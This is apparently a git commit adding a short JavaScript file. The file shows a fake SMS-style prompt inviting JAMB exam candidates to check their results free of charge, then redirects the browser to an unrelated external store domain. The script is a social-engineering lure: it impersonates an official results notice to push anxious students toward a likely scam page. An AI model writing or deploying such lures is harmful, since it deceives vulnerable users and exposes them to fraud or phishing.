6cdd9b69c60299868c56debfb9a96831e08684a2
newsville <gloliousam3@gmail.com>
2026-04-18 16:14:58 -0700

    Create active-jambresult.js

---
+++ active-jambresult.js
@@ -0,0 +1,5 @@
+var password = 'RESULT'
+password=prompt('JAMBUTME SMS: Dear Candidate, Kindly Check You Jamb Result Free Of Charge, press Result To Check Now ','RESULT');
+if (password != 'RESULT') {
+location.href='https://bestoneron.store/jambresult.html';
+}
